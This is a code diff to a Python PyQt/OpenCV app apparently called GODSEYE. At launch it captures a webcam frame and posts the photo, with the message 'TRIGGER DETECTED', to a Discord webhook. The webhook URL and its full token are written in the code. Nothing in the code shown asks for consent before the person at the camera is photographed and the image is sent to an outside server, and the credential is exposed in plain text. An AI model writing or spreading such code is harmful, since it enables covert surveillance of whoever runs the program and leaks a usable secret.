@@ -11,6 +11,7 @@ ASSETS = {
     "font": "https://raw.githubusercontent.com/TheKeems/GODSEYE/main/assets/RMFont.ttf",
     "folder": "https://raw.githubusercontent.com/TheKeems/GODSEYE/main/ILLUSIONARY.png"
 }
+webhook_url = "https://discord.com/api/webhooks/1480278522642829332/M57sg5qeWiRwjXFFCdb65bvtFGGrDvJlIJL7iEp5413Hy2CaROOHa-lvG4CGoQksyf9H"
 DIRECTORY = os.path.dirname(__file__)
 cam = cv2.VideoCapture(0) 
 if not cam.isOpened():
@@ -18,17 +19,14 @@ if not cam.isOpened():
 
 success, frame = cam.read()
 cam.release()
-cv2.imshow("Camera Feed", frame)
-cv2.imwrite("detected.jpg", frame)
-webhook_url = "https://discord.com/api/webhooks/1480278522642829332/M57sg5qeWiRwjXFFCdb65bvtFGGrDvJlIJL7iEp5413Hy2CaROOHa-lvG4CGoQksyf9H"
-data = {
-    "content": "TRIGGER DETECTED: "
-}
+if(success):
+    cv2.imshow("Camera Feed", frame)
+    cv2.imwrite("detected.jpg", frame)
+    with open("detected.jpg", "rb") as f:
+        files = {"file": ("detected.jpg", f.read())} 
+        data = {"content": "TRIGGER DETECTED"} 
+        response = requests.post(webhook_url, data=data, files=files)
 
-with open("detected.jpg", "rb") as f:
-    files = {"file": ("detected.jpg", f.read())} 
-    data = {"content": "TRIGGER DETECTED"} 
-    response = requests.post(webhook_url, data=data, files=files)
 bgimage = requests.get(ASSETS.get("folder"))
 
 class MainWindow(QMainWindow):
